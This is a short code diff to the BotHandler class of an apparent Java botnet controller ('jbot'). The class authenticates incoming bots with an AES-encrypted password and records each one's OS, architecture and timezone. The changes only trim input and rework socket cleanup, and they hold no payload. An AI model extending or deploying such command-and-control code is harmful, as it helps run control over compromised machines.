@@ -7,7 +7,9 @@ import me.aaronakhtar.jbot.objects.Bot;
 import me.aaronakhtar.jbot.objects.ConnectionType;
 
 import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
 import java.net.Socket;
 
 public class BotHandler implements Runnable {
@@ -29,10 +31,10 @@ public class BotHandler implements Runnable {
             bufferedReader = new BufferedReader(new InputStreamReader(this.socket.getInputStream()));
 
             if ((input = bufferedReader.readLine()) != null){
-                if (Aes.decrypt(input, Main.encryptionKey).equals(authPassword)){
+                if (Aes.decrypt(input.trim(), Main.encryptionKey).equals(authPassword)){
 
                     if ((input = bufferedReader.readLine()) != null){
-                        if ((input = Aes.decrypt(input, Main.encryptionKey)) != null){
+                        if ((input = Aes.decrypt(input.trim(), Main.encryptionKey)) != null){
                                                         // os#arch#timezone
                             final String[] is = input.split("#");
                             final Bot bot = new Bot(socket, is[0], is[1], is[2]);
@@ -49,7 +51,11 @@ public class BotHandler implements Runnable {
         }catch (Exception e){
             Utilities.handleException(e);
         }finally {
-            if (!isAuthenticated && Utilities.isSocketAlive(this.socket)) {
+            try {
+                if (!isAuthenticated && Utilities.isSocketAlive(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())))) {
+                    Utilities.closeSocket(this.socket);
+                }
+            }catch (Exception e){
                 Utilities.closeSocket(this.socket);
             }
         }
